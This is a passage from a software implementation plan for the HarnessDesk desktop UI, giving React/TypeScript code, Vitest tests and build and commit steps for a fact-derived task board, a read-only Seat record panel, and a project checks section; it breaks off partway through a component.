          /* Wrapped, not scrolled: five fixed columns in a pane that gives its
             width up to the right dock and the rail. A scrolled board does not
             get shorter, it hides a column — and the first to go is Needs you,
             which is what the board was opened to find.

             Derived: the columns are facts, so no card is dragged, no column
             takes a drop or a title, and an empty column says so — the design
             system's `derived` board draws each of those itself. Work goes on
             through the header's door. */
          <Board wrap derived>
            {shown.map((column) => {
              const cards = byColumn.get(column.id) ?? []
              return (
                <BoardColumn key={column.id} title={column.title} count={cards.length} tint={column.tint}>
                  {cards.map((intent) => (
                    <IntentCard
                      key={intent.id}
                      intent={intent}
                      room={room}
                      placement={placed.get(intent.id) ?? null}
                      now={now}
                      attached={attached}
                      evidence={evidence?.cards.find((one) => one.card === intent.id)}
                      checks={evidence ?? NO_CHECKS}
                      onRunCheck={(name) => runCheck(intent.id, name)}
                      onOpenHolder={() => openHolder(intent)}
                      onAct={(verb, outcome) =>
                        verb === 'block' ? setStopping(intent) : act(intent.id, verb, undefined, outcome)
                      }
                    />
                  ))}
                </BoardColumn>
              )
            })}
          </Board>
```

9. In `IntentCard`, replace `dragging,` in the destructured props with `placement,`; delete `onDragStart,` and `onDragEnd,`; in its props type replace `dragging: boolean` with:

```tsx
  /** The column its facts put it in, and why when the column cannot say. */
  placement: Placement | null
```

   and delete `onDragStart: () => void` and `onDragEnd: () => void`.
10. On its `<BoardCard`, replace the comment *"The whole card is the handle…"*, `draggable`, `onDragStart={…}`, `onDragEnd={onDragEnd}` and the `className={…}` with:

```tsx
      /* Not a handle: the column is the card's facts, so there is nowhere to
         drag it, and every verb is in the menu below. */
```

11. Replace the comment above `priority` and the whole `priority={…}` with:

```tsx
      /* A card never repeats its own column — work set aside has a column of
         its own, so it no longer needs a chip to tell it from good work.
         Stranded says how long. And a card in Needs you says which fact put
         it there — *verify failed*, *CI unknown*, *nothing checked* — because
         that column is many reasons and a person has to know which is theirs. */
      priority={
        stranded !== null
          ? { label: `stranded ${describeAge(stranded)}`, tone: 'warning' }
          : placement?.column === 'needs' && placement.why
            ? { label: placement.why, tone: 'warning' }
            : /* What the card answered, which is the one judgement a finished
               flow card carries — and the thing the next round was decided
               on, so a reader asking "why did that open?" reads it here.
               Neutral, always: the words are the flow author's own and this
               surface has no way to know which of them is the good news. */
              intent.outcome
              ? { label: intent.outcome, tone: 'neutral' as const }
              : undefined
      }
```

12. In `IntentCard`, replace the `role` memo and its comment with the running flow's role only for a card its own rounds opened:

```tsx
  /* The role this card was addressed to, as the running flow defines it — and
     only when one of that run's own rounds opened it: a card an earlier,
     stopped run left open is nobody's step now. A room with no flow has no
     entry here at all, which is every room that existed before flows — and
     then every branch below falls through to what the card has always drawn.
     The menu is the design system's `Popover` and `Menu`, which close
     themselves when something takes the screen (#214). */
  const role = useMemo(
    () =>
      flowRoleOf(
        intent,
        (snapshot.flowRuns.get(room) ?? []).find((one) => one.state === 'running' || one.state === 'stalled'),
      ),
    [intent, room, snapshot.flowRuns],
  )
```

- [ ] **Step 5: Run the tests to see them pass**

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/components/TeamBoardPane.test.tsx src/components/TeamRoomPane.test.tsx src/lib/board-facts.test.ts`
Expected: PASS — every test in each.

- [ ] **Step 6: Prove the tests can fail, and look at it**

1. In `placed`, pass `evidence: undefined`: `finished work is Ready only on a fact, and says which fact when it needs you` fails. Restore it.
2. Put `draggable` back on `<BoardCard`: `no card is dragged, and no column takes a drop` fails. Restore it.
3. In `placeCard`, make `case 'done':` return `intent.note?.includes('pass') ? { column: 'ready', why: null } : settled(evidence)`: `a message between agents is never evidence: the channel and a finish note saying the tests pass move nothing` fails here as well as in Task 18's test. Restore it.
4. Draw every column — `shown` = `COLUMNS`: `columns are what is known about the work, so no card has to repeat its own` fails on a sixth, empty *Set aside*. Restore it.
5. Drop `derived` from `<Board wrap derived>`: `the board is derived: no column takes a title, and an empty one says so` fails. Restore it.
6. In `placed`, read the role as `flowRun?.flow.roles.find((one) => one.id === intent.role)` instead of `flowRoleOf(intent, flowRun)`: `a card an earlier run left open is not the person's step…` fails — the left-over card is in *Needs you*. Restore it.

Run the preview: *Board — what the desk observed* now shows card 1 in *Ready*, cards 2 and 6 in *Needs you* wearing *verify out of date* and *nothing checked*, card 3 *In review*, card 4 *Working*, card 5 *To do*, and card 7 in *Set aside*; an empty column says *Nothing here*; no column has a slot to add in, and no card takes a grab cursor. Then:

```bash
node script/design-audit.mjs --strict
pnpm test:ui-system
```

Expected: the audit's findings unchanged; every UI-system spec passing.

- [ ] **Step 7: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/ui/src/components/TeamBoardPane.tsx packages/ui/src/components/TeamBoardPane.test.tsx
git commit -m "feat(evidence): the board's columns come from the facts

To do, Working, Needs you, In review, Ready — and Set aside while anything
is — each card where its state and what the desk observed put it, drawn as a
derived board: nothing is dragged, no column takes a title, and an empty
column says so. Every verb stays in the card's menu. A card in Needs you says
which fact put it there; a stranded claim now needs you too; a flow's role is
the person's only for a card its own round opened. A message or a finish
note saying the tests pass moves nothing. TeamBoardPane.test.tsx's tests
that named the old columns or dragged are rewritten to what the board does
now, and the quick add's three are deleted with it.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 20: A conversation's Seat record

> **Needs phase 2's `lib/agents.ts`** (its Tasks 12 and 18): `ceilingWords`, `originWords` and `passedWords`.

A conversation's details show its Seat record, read-only because it is: the Agent it was seated as and where the Agent came from, what it runs on, what was passed over on the way, what its standing order told it it may do, the checkout it started in, the board it was seated for, and when it opened and closed. At the head of the Agents inspector (`AgentsView` in `Details.tsx`), above the sub-agents the seat started, because a Seat holds them. A conversation never seated shows none of it. `ceiling` is not drawn: it is null until phase 3, and drawing it is phase 3's.

The standing order is drawn in its own generation's words, never translated (`orderWords`): today's `permission:` as phase 2 says it (*Read · asked*), phase 3's `ceiling:` as *Edit · its ceiling* — so a record phase 3 writes draws before phase 3 draws anything of its own. A Seat a backup brought says so: *From a backup*, and that this desk did not keep it, so it says nothing about what the conversation is here.

**Files:**
- Create: `packages/ui/src/components/SeatRecordBlock.tsx`
- Modify: `packages/ui/src/components/Details.tsx` (`AgentsView`), `packages/ui/src/state/store.ts` (`seatRecord`)
- Modify: `packages/ui/src/preview/harness.tsx` (`seatRecord`), `packages/ui/src/preview/main.tsx` (the Agents side panel's frame)
- Modify: `script/check-reachable.mjs` (unpin `evidence/seat`)
- Test: `packages/ui/src/components/SeatRecordBlock.test.tsx` (new); `packages/ui/src/state/store.evidence.test.ts` (one test appended)

**Proof needs:** the rendered UI

**Interfaces:**
- Consumes: `evidence/seat` (Task 4); `ceilingWords(permission)`, `originWords(origin, project)`, `passedWords(candidate)` (phase 2's `lib/agents.ts`); `shortSha` (Task 15); `shortPath` (`lib/paths.ts`); `KeyValue`, `KeyValueRow` (`../design`); `GroupLine`, `PanelEmpty` (`./Panel`); `useActiveSession`.
- Produces: `AppStore.seatRecord(runtime, sessionId): Promise<SeatRecord | null>`; `SeatRecordBlock()`; `SeatRecordView({ seat })`; `orderWords(standing: SeatRecord['standing']): string`.

- [ ] **Step 1: Confirm phase 2's words**

Run: `grep -n "export const ceilingWords\|export const originWords\|export const passedWords" packages/ui/src/lib/agents.ts`
Expected: all three. If any is missing, stop and report.

- [ ] **Step 2: Write the failing tests**

1. Create `packages/ui/src/components/SeatRecordBlock.test.tsx`:

```tsx
import { act } from 'react'
import { createRoot, type Root } from 'react-dom/client'
import { afterEach, beforeEach, expect, it, vi } from 'vitest'

import { runtimeId, sessionKey, type Session, type SessionId, type TeamState } from '@harnessdesk/protocol'

import { EVIDENCE_ROOM, PREVIEW_SEAT } from '../preview/evidence-fixture'
import { StoreProvider } from '../state/context'
import { emptySnapshot, type AppSnapshot, type AppStore } from '../state/store'
import { SeatRecordBlock } from './SeatRecordBlock'

/*
 * A conversation's Seat record, read-only, at the head of its Agents
 * inspector — and nothing at all for a conversation the desk never seated.
 */

;(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true

let container: HTMLDivElement
let root: Root

beforeEach(() => {
  container = document.createElement('div')
  document.body.appendChild(container)
  root = createRoot(container)
})

afterEach(() => {
  act(() => root.unmount())
  container.remove()
})

const KEY = sessionKey(runtimeId('codex'), 's1' as SessionId)

const mount = async (seatRecord: (runtime: string, sessionId: string) => Promise<unknown>) => {
  const snapshot = {
    ...emptySnapshot(),
    status: 'open',
    home: '/home/shane',
    activeSessionKey: KEY,
    sessions: new Map([[KEY, { id: 's1', runtime: 'codex', cwd: '/work/shane/HarnessDesk', turns: [], itemsLoaded: true } as unknown as Session]]),
    teams: new Map([[EVIDENCE_ROOM, { id: EVIDENCE_ROOM, name: 'Checkout hardening' } as unknown as TeamState]]),
  } as AppSnapshot
  const store = { subscribe: () => () => {}, getSnapshot: () => snapshot, seatRecord: vi.fn(seatRecord) } as unknown as AppStore
  await act(async () => {
    root.render(
      <StoreProvider store={store}>
        <SeatRecordBlock />
      </StoreProvider>,
    )
  })
  await act(async () => {})
  return store
}

it('shows who was seated, on what, told what, where, on which board, and since when', async () => {
  const store = await mount(async () => PREVIEW_SEAT)
  expect(store.seatRecord).toHaveBeenCalledWith('codex', 's1')
  const text = container.textContent ?? ''
  expect(text).toContain('Seat record')
  expect(text).toContain('Scout · In HarnessDesk')
  expect(text).toContain('Alpha · alpha-max')
  expect(text).toContain('Beta · beta-pro — passed over')
  expect(text).toContain('Read · asked')
  expect(text).toContain('retry-on-502 at a1b2c3d')
  expect(text).toContain('~/code/HarnessDesk')
  expect(text).toContain('Checkout hardening')
  expect(text).toContain('Open')
  // The record is read-only: nothing here can change it.
  expect(container.querySelector('button, input, textarea')).toBeNull()
})

it('a closed seat says how the desk let it go', async () => {
  await mount(async () => ({ ...PREVIEW_SEAT, closed: { at: Date.UTC(2026, 8, 18, 15, 0), why: 'deleted' } }))
  expect(container.textContent).toContain('Its conversation was deleted')
})

it("a seat phase 3 kept for an Agent that said only `ceiling:` is drawn in that order's words", async () => {
  await mount(async () => ({ ...PREVIEW_SEAT, standing: { kind: 'ceiling', level: 'edit' } }))
  expect(container.textContent).toContain('Edit · its ceiling')
  expect(container.textContent).not.toContain('Read · asked')
})

it('a Seat a backup brought says so, and that it says nothing about this conversation here', async () => {
  await mount(async () => ({ ...PREVIEW_SEAT, restored: { at: Date.UTC(2026, 8, 18, 16, 0) } }))
  expect(container.textContent).toContain('From a backup')
  expect(container.textContent).toContain('This desk did not keep this seat')
})

it('a conversation the desk never seated shows nothing', async () => {
  await mount(async () => null)
  expect(container.innerHTML).toBe('')
})

it('a record that cannot be read says so, in the host’s words', async () => {
  await mount(async () => {
    throw new Error('the connection to HarnessDesk was lost')
  })
  expect(container.textContent).toBe('Its Seat record could not be read: the connection to HarnessDesk was lost')
})
```

2. In `packages/ui/src/state/store.evidence.test.ts`, add `runtimeId, sessionId,` to the import from `@harnessdesk/protocol` and `PREVIEW_SEAT` to the import from `../preview/evidence-fixture`, and append:

```ts
it("a conversation's Seat record is read from the host as it is", async () => {
  request.mockResolvedValueOnce(PREVIEW_SEAT)
  await expect(store.seatRecord(runtimeId('codex'), sessionId('s1'))).resolves.toBe(PREVIEW_SEAT)
  expect(request).toHaveBeenLastCalledWith('evidence/seat', { runtime: 'codex', sessionId: 's1' })
})
```

- [ ] **Step 3: Run them to see them fail**

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/components/SeatRecordBlock.test.tsx src/state/store.evidence.test.ts`
Expected: FAIL — `Failed to resolve import "./SeatRecordBlock"`, and `store.seatRecord is not a function`.

- [ ] **Step 4: The store reads it**

In `packages/ui/src/state/store.ts`, add `type SeatRecord,` to the import from `@harnessdesk/protocol`, and after `runCheck` add:

```ts

  /** A conversation's Seat record, or null when the desk never seated it. Throws when it cannot be read. */
  async seatRecord(runtime: RuntimeId, sessionId: SessionId): Promise<SeatRecord | null> {
    return (await this.transport.request('evidence/seat', { runtime, sessionId })) as SeatRecord | null
  }
```

And in `script/check-reachable.mjs`, delete the `'evidence/seat': …` line from `UNREACHED`.

- [ ] **Step 5: The record, drawn**

Create `packages/ui/src/components/SeatRecordBlock.tsx`:

```tsx
import { useEffect, useState } from 'react'

import type { CeilingLevel, SeatRecord } from '@harnessdesk/protocol'

import { KeyValue, KeyValueRow } from '../design'
import { ceilingWords, originWords, passedWords } from '../lib/agents'
import { shortSha } from '../lib/evidence'
import { shortPath } from '../lib/paths'
import { useActiveSession, useSnapshot, useStore } from '../state/context'
import { GroupLine, PanelEmpty } from './Panel'

/**
 * A conversation's Seat record, read-only because it is: written once when the
 * seat was kept, closed once when the desk let it go, and kept after both the
 * conversation and its room are gone.
 *
 * At the head of the Agents inspector, above the sub-agents the seat started,
 * because that is what a Seat holds. A conversation the desk never seated has
 * no record and this draws nothing — the plain path stays plain.
 *
 * `ceiling` is not drawn here. It is null until phase 3 fills it, and drawing
 * it is phase 3's; the seam is the Seat record's type, not this block. What
 * the Agent's standing order said is drawn in that order's own generation of
 * words — today's `permission:`, or phase 3's `ceiling:` — never translated
 * into the other's.
 */
export const SeatRecordBlock = () => {
  const store = useStore()
  const session = useActiveSession()
  const runtime = session?.runtime ?? null
  const id = session?.id ?? null
  const key = JSON.stringify([runtime, id])
  const [read, setRead] = useState<
    | { readonly key: string; readonly seat: SeatRecord | null }
    | { readonly key: string; readonly problem: string }
    | null
  >(null)

  useEffect(() => {
    if (!runtime || !id) return
    let live = true
    const asked = JSON.stringify([runtime, id])
    store.seatRecord(runtime, id).then(
      (seat) => {
        if (live) setRead({ key: asked, seat })
      },
      (error: unknown) => {
        if (live) setRead({ key: asked, problem: error instanceof Error ? error.message : String(error) })
      },
    )
    return () => {
      live = false
    }
  }, [store, runtime, id])

  if (!read || read.key !== key) return null
  if ('problem' in read) return <PanelEmpty>{`Its Seat record could not be read: ${read.problem}`}</PanelEmpty>
  return read.seat ? <SeatRecordView seat={read.seat} /> : null
}

/** How the desk let a seat go, in words. */
const closedWords = (why: string): string =>
  why === 'deleted' ? 'Its conversation was deleted' : `Closed — ${why}`

const LEVEL_WORDS: Readonly<Record<CeilingLevel, string>> = { read: 'Read', edit: 'Edit', publish: 'Publish', merge: 'Merge' }

/** What the Agent's standing order said it may do, as that order said it: a `permission:`, or a `ceiling:`. */
export const orderWords = (standing: SeatRecord['standing']): string =>
  standing.kind === 'permission' ? ceilingWords(standing.permission) : `${LEVEL_WORDS[standing.level]} · its ceiling`

/** One Seat record, whole. */
export const SeatRecordView = ({ seat }: { readonly seat: SeatRecord }) => {
  const snapshot = useSnapshot()
  const project = seat.checkout.project.split('/').filter(Boolean).at(-1) ?? null
  const room = seat.board ? (snapshot.teams.get(seat.board)?.name ?? 'a room this desk no longer has') : null
  return (
    <section aria-label="Seat record">
      <GroupLine left="Seat record" right={seat.restored ? 'From a backup' : seat.closed ? 'Closed' : 'Open'} />
      <KeyValue>
        <KeyValueRow label="Agent">
          {seat.agent
            ? `${seat.agent.name} · ${originWords(seat.agent.origin, project)}`
            : `No Agent — a flow's ${seat.role ?? 'role'} seat`}
        </KeyValueRow>
        <KeyValueRow label="Runs on">{seat.seatLabel}</KeyValueRow>
        {seat.passedOver.length > 0 && (
          <KeyValueRow label="Passed over">{seat.passedOver.map(passedWords).join('; ')}</KeyValueRow>
        )}
        <KeyValueRow label="Told it may">{orderWords(seat.standing)}</KeyValueRow>
        <KeyValueRow label="Checkout">
          {seat.checkout.head
            ? `${seat.checkout.branch ?? 'a detached HEAD'} at ${shortSha(seat.checkout.head)}`
            : 'no commit yet'}
        </KeyValueRow>
        <KeyValueRow label="Folder">{shortPath(seat.checkout.cwd, snapshot.home)}</KeyValueRow>
        {room && <KeyValueRow label="Board">{seat.role ? `${room} · as ${seat.role}` : room}</KeyValueRow>}
        <KeyValueRow label="Opened">{new Date(seat.openedAt).toLocaleString()}</KeyValueRow>
        {seat.closed && (
          <KeyValueRow label="Closed">{`${closedWords(seat.closed.why)}, ${new Date(seat.closed.at).toLocaleString()}`}</KeyValueRow>
        )}
        {seat.restored && (
          <KeyValueRow label="Restored">{`From a backup, ${new Date(seat.restored.at).toLocaleString()}. This desk did not keep this seat, so it says nothing about what this conversation is here.`}</KeyValueRow>
        )}
      </KeyValue>
    </section>
  )
}
```

In `packages/ui/src/components/Details.tsx`, add `import { SeatRecordBlock } from './SeatRecordBlock'` after `import { Agents } from './Agents'`, and in `AgentsView` put it above `<Agents …/>`:

```tsx
    <InspectorFrame find="Filter sub-agents" query={query} onQuery={setQuery} foot={foot}>
      {/* The Seat this conversation was kept as, above the sub-agents it
          started — a Seat holds them. Nothing for a conversation never seated. */}
      <SeatRecordBlock />
      <Agents query={query} onFoot={onFoot} />
    </InspectorFrame>
```

- [ ] **Step 6: The preview**

1. In `packages/ui/src/preview/harness.tsx`, add `type SeatRecord,` to the import from `@harnessdesk/protocol` and `PREVIEW_SEAT` to the import from `./evidence-fixture`, and after `runCheck = …` add:

```tsx
  /* The preview's own conversation was kept as a Seat; nothing else was. By
     its key, never by which runtime it is (`check-layering`). */
  seatRecord = async (runtime: string, sessionId: string): Promise<SeatRecord | null> =>
    sessionKey(runtime, sessionId) === PREVIEW_SESSION_KEY ? PREVIEW_SEAT : null
```

2. In `packages/ui/src/preview/main.tsx`, import `AgentsView` beside `ChangesView, TrajectoryView` from `../components/Details`, and after the *Side panel — Trajectory* frame add:

```tsx
        {/* The conversation's Seat record, at the head of its Agents inspector. */}
        <Frame title="Side panel — Agents, with the Seat record">
          <div className="h-[420px]">
            <PaneProvider
              scope={{
                paneId: 'preview' as never,
                view: { kind: 'conversation', session: PREVIEW_SESSION_KEY } as never,
                sessionKey: PREVIEW_SESSION_KEY,
              }}
            >
              <AgentsView />
            </PaneProvider>
          </div>
        </Frame>
```

- [ ] **Step 7: Run the tests to see them pass**

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/components/SeatRecordBlock.test.tsx src/state/store.evidence.test.ts`
Expected: PASS — 6 and 6 tests.

- [ ] **Step 8: Prove the tests can fail, and look at it**

1. In `SeatRecordBlock`, replace `return read.seat ? <SeatRecordView seat={read.seat} /> : null` with `return read.seat ? <SeatRecordView seat={read.seat} /> : <PanelEmpty>No Seat record.</PanelEmpty>`: `a conversation the desk never seated shows nothing` fails — the plain path is no longer plain. Restore it.
2. In `SeatRecordView`, delete the `Passed over` row: `shows who was seated, on what, told what, where…` fails. Restore it.
3. In `orderWords`, draw the ceiling arm as `ceilingWords('read')`: `a seat phase 3 kept for an Agent that said only ceiling:…` fails. Restore it.
4. Delete the `Restored` row: `a Seat a backup brought says so…` fails. Restore it.

Run the preview: *Side panel — Agents, with the Seat record* shows *Scout · In HarnessDesk*, *Alpha · alpha-max*, *Beta · beta-pro — passed over*, *Read · asked*, *retry-on-502 at a1b2c3d*. Then:

```bash
node script/design-audit.mjs --strict
pnpm test:ui-system
```

Expected: the audit's findings unchanged; every UI-system spec passing.

- [ ] **Step 9: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/ui/src/components/SeatRecordBlock.tsx packages/ui/src/components/SeatRecordBlock.test.tsx packages/ui/src/components/Details.tsx packages/ui/src/state/store.ts packages/ui/src/state/store.evidence.test.ts packages/ui/src/preview/harness.tsx packages/ui/src/preview/main.tsx script/check-reachable.mjs
git commit -m "feat(evidence): a conversation's details show its Seat record

At the head of the Agents inspector, read-only: the Agent and where it came
from, what it runs on, what was passed over, what its standing order said it
may do — in that order's own generation of words, permission: or ceiling: —
the checkout it started in, its board, and when it opened and closed. A Seat
a backup brought says so. A conversation never seated shows none of it.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 21: A project's checks, on its page

> **Reads `.harnessdesk/checks.yml` commands, and runs none.** It shows each command verbatim, as `evidence/checks` (Task 8) returns it — as committed — and whether this Mac has approved it for this version of the file: *Approved on this Mac*, *Changed since approved here* for a command that changed, *Not approved on this Mac* for one added or renamed. Its tests pin all three, and that a working copy that is not what is committed is said; the approvals themselves never reach the renderer. Asking again before a run is Task 17's, through Task 11. **Needs phase 2's `ProjectPage.tsx`** (its Task 17).

A project's page lists its named checks: each command verbatim, whether this Mac has approved it, and the file they are read from and the commit they were read at. A working copy of the file that differs from what is committed is said — it is not what runs, so a change runs only once it is committed. A check the file refuses is listed with where and why, never hidden. The section appears only once the project has the file.

**Files:**
- Create: `packages/ui/src/components/ProjectChecks.tsx`
- Modify: `packages/ui/src/components/ProjectPage.tsx` (the section, after Agents), `packages/ui/src/state/store.ts` (`projectChecks`)
- Modify: `packages/ui/src/preview/harness.tsx` (`projectChecks`), `packages/ui/src/preview/main.tsx` (a frame)
- Modify: `script/check-reachable.mjs` (unpin `evidence/checks`; after this, `UNREACHED` holds none of this phase's verbs)
- Test: `packages/ui/src/components/ProjectChecks.test.tsx` (new); `packages/ui/src/state/store.evidence.test.ts` (one test appended)
- Test, named edit: `packages/ui/src/components/ProjectPage.test.tsx` (phase 2's) — the store it mounts gains `projectChecks`, since the page now reads them, and one test is appended

**Proof needs:** the rendered UI

**Interfaces:**
- Consumes: `evidence/checks` and `ProjectChecks.at`, `uncommitted` (Task 8); `ProjectPage({ root, onBack })` (phase 2's Task 17); `Chip` (its readiness form), `CodeText`, `Note` (with `tone="warn"`), `Row`, `Rows`, `RowValue`, `SectionHead` (`../design`); `shortSha` (Task 15); `shortPath`.
- Produces: `AppStore.projectChecks(project): Promise<ProjectChecks>`; `ProjectChecks({ root })`; `ProjectChecksView({ checks })`.

- [ ] **Step 1: Confirm the page**

Run: `grep -n "export const ProjectPage\|section aria-label=\"Agents\"\|agentsIn: vi.fn" packages/ui/src/components/ProjectPage.tsx packages/ui/src/components/ProjectPage.test.tsx`
Expected: the page, its Agents section, and the test store's `agentsIn`. If the page is not there, stop: phase 2's Task 17 has not landed.

- [ ] **Step 2: Write the failing tests**

1. Create `packages/ui/src/components/ProjectChecks.test.tsx`:

```tsx
import { act } from 'react'
import { createRoot, type Root } from 'react-dom/client'
import { afterEach, beforeEach, expect, it, vi } from 'vitest'

import { PREVIEW_CHECKS } from '../preview/evidence-fixture'
import { StoreProvider } from '../state/context'
import { emptySnapshot, type AppSnapshot, type AppStore } from '../state/store'
import { ProjectChecks } from './ProjectChecks'

/*
 * A project's checks on its page: each command verbatim and whether this Mac
 * has seen it — and no section at all for a project with no checks file.
 */

;(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true

let container: HTMLDivElement
let root: Root

beforeEach(() => {
  container = document.createElement('div')
  document.body.appendChild(container)
  root = createRoot(container)
})

afterEach(() => {
  act(() => root.unmount())
  container.remove()
})

const ROOT = '/work/shane/HarnessDesk'

const mount = async (projectChecks: (root: string) => Promise<unknown>) => {
  const snapshot = { ...emptySnapshot(), status: 'open', home: '/home/shane' } as AppSnapshot
  const store = { subscribe: () => () => {}, getSnapshot: () => snapshot, projectChecks: vi.fn(projectChecks) } as unknown as AppStore
  await act(async () => {
    root.render(
      <StoreProvider store={store}>
        <ProjectChecks root={ROOT} />
      </StoreProvider>,
    )
  })
  await act(async () => {})
  return store
}

it('lists each check with its command verbatim, whether this Mac has approved it, and the file and commit it is read from', async () => {
  const store = await mount(async () => PREVIEW_CHECKS)
  expect(store.projectChecks).toHaveBeenCalledWith(ROOT)
  const text = container.textContent ?? ''
  expect(text).toContain('Read from ~/code/HarnessDesk/.harnessdesk/checks.yml, as committed at a1b2c3d.')
  expect([...container.querySelectorAll('code, [class*="mono"]')].map((one) => one.textContent)).toEqual([
    'pnpm verify',
    'pnpm lint --max-warnings 0',
    'pnpm typecheck',
  ])
  expect(text).toContain('Approved on this Mac')
  expect(text).toContain('Changed since approved here')
  expect(text).toContain('Not approved on this Mac')
  expect(text).not.toContain('Your working copy')
})

it('a working copy that is not what is committed is said, and what is listed is still the committed file', async () => {
  await mount(async () => ({ ...PREVIEW_CHECKS, uncommitted: true }))
  const text = container.textContent ?? ''
  expect(text).toContain('Your working copy of this file is not what is committed.')
  expect(text).toContain('pnpm verify')
})

it('a check the file refuses is listed with where and why, never hidden', async () => {
  await mount(async () => PREVIEW_CHECKS)
  const text = container.textContent ?? ''
  expect(text).toContain('e2e.run')
  expect(text).toContain('not plain printable ASCII')
  expect(text).toContain('Not offered')
})

it('a project with no checks file shows no section at all', async () => {
  await mount(async () => ({ ...PREVIEW_CHECKS, exists: false, checks: [], problems: [] }))
  expect(container.innerHTML).toBe('')
})

it('checks that cannot be read say so, in the host’s words', async () => {
  await mount(async () => {
    throw new Error('/work/shane/elsewhere is outside every open workspace. Open its folder first.')
  })
  expect(container.textContent).toContain('Its checks could not be read')
  expect(container.textContent).toContain('is outside every open workspace')
})
```

2. In `packages/ui/src/state/store.evidence.test.ts`, add `PREVIEW_CHECKS` to the import from `../preview/evidence-fixture`, and append:

```ts
it("a project's checks are read from the host as they are", async () => {
  request.mockResolvedValueOnce(PREVIEW_CHECKS)
  await expect(store.projectChecks('/work/storefront')).resolves.toBe(PREVIEW_CHECKS)
  expect(request).toHaveBeenLastCalledWith('evidence/checks', { project: '/work/storefront' })
})
```

3. In `packages/ui/src/components/ProjectPage.test.tsx`, add `import type { ProjectChecks } from '@harnessdesk/protocol'`; above `const mount`, add:

```tsx
/* The storefront names one check; the others have no checks file. */
const CHECKS = (path: string): ProjectChecks => ({
  project: path,
  file: `${path}/.harnessdesk/checks.yml`,
  exists: path === STOREFRONT.path,
  at: null,
  uncommitted: false,
  checks: path === STOREFRONT.path ? [{ name: 'verify', run: 'pnpm verify', timeout: 600, seen: 'no' }] : [],
  problems: [],
})
```

   in `mount`'s store, after `agentsIn: …,`, add `projectChecks: vi.fn(async (path: string) => CHECKS(path)),`; and append:

```tsx
it('a project’s checks follow its Agents, and a project with no checks file shows none', async () => {
  mount(<WorkspacesSection focus={STOREFRONT.path} />)
  await settle()
  const sections = [...container.querySelectorAll('section[aria-label]')].map((one) => one.getAttribute('aria-label'))
  expect(sections).toEqual(['Agents', 'Checks'])
  expect(container.querySelector('section[aria-label="Checks"]')?.textContent).toContain('pnpm verify')

  act(() => root.unmount())
  root = createRoot(container)
  mount(<WorkspacesSection focus={DOCS.path} />)
  await settle()
  expect(container.querySelector('section[aria-label="Checks"]')).toBeNull()
})
```

- [ ] **Step 3: Run them to see them fail**

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/components/ProjectChecks.test.tsx src/state/store.evidence.test.ts src/components/ProjectPage.test.tsx`
Expected: FAIL — `Failed to resolve import "./ProjectChecks"`, `store.projectChecks is not a function`, and the appended page test (`['Agents']`).

- [ ] **Step 4: The store reads them**

In `packages/ui/src/state/store.ts`, add `type ProjectChecks,` to the import from `@harnessdesk/protocol`, and after `seatRecord` add:

```ts

  /** A project's named checks, each command verbatim and whether this Mac has approved it. Throws when they cannot be read. */
  async projectChecks(project: string): Promise<ProjectChecks> {
    return (await this.transport.request('evidence/checks', { project })) as ProjectChecks
  }
```

And in `script/check-reachable.mjs`, delete the `'evidence/checks': …` line from `UNREACHED`.

- [ ] **Step 5: The section**

Create `packages/ui/src/components/ProjectChecks.tsx`:

```tsx
import { useEffect, useState } from 'react'

import type { ProjectChecks as Checks } from '@harnessdesk/protocol'

import { Chip, CodeText, Note, Row, Rows, RowValue, SectionHead } from '../design'
import { shortSha } from '../lib/evidence'
import { shortPath } from '../lib/paths'
import { useSnapshot, useStore } from '../state/context'

/**
 * A project's named checks, on its page: each command verbatim, as committed,
 * and whether this Mac has approved it for this version of the file.
 *
 * Appears only once the project has a `.harnessdesk/checks.yml` — a new noun
 * shows up when it is used, and a project without one shows nothing here.
 * Read-only: the committed file is the truth and this says which file, at
 * which commit. A working copy that differs is said — it is not what runs —
 * and a check the file refuses is listed with where and why, and a card
 * offers it greyed.
 */
export const ProjectChecks = ({ root }: { readonly root: string }) => {
  const store = useStore()
  const [read, setRead] = useState<
    { readonly root: string; readonly checks: Checks } | { readonly root: string; readonly problem: string } | null
  >(null)

  useEffect(() => {
    let live = true
    store.projectChecks(root).then(
      (checks) => {
        if (live) setRead({ root, checks })
      },
      (error: unknown) => {
        if (live) setRead({ root, problem: error instanceof Error ? error.message : String(error) })
      },
    )
    return () => {
      live = false
    }
  }, [store, root])

  if (!read || read.root !== root) return null
  if ('problem' in read) {
    return (
      <section aria-label="Checks">
        <SectionHead name="Checks" />
        <Rows>
          <Row title="Its checks could not be read" desc={read.problem} />
        </Rows>
      </section>
    )
  }
  return read.checks.exists ? <ProjectChecksView checks={read.checks} /> : null
}

/** Whether this Mac has approved a command as the file says it now, in words. */
const seenWords = (seen: 'yes' | 'no' | 'changed'): string =>
  seen === 'yes' ? 'Approved on this Mac' : seen === 'changed' ? 'Changed since approved here' : 'Not approved on this Mac'

/** The checks a project's file names, and what is wrong with it. */
export const ProjectChecksView = ({ checks }: { readonly checks: Checks }) => {
  const snapshot = useSnapshot()
  return (
    <section aria-label="Checks">
      <SectionHead name="Checks" />
      <Note>
        {`Read from ${shortPath(checks.file, snapshot.home)}${checks.at ? `, as committed at ${shortSha(checks.at)}` : ''}. A card runs one only once this Mac has approved its command, and asks again whenever the file changes.`}
      </Note>
      {checks.uncommitted && (
        <Note tone="warn">
          Your working copy of this file is not what is committed. A check runs only as it is committed, so commit the change for a card to offer it.
        </Note>
      )}
      <Rows>
        {checks.checks.length === 0 && checks.problems.length === 0 && <Row title="It names no checks" />}
        {checks.checks.map((check) => (
          <Row
            key={check.name}
            title={check.name}
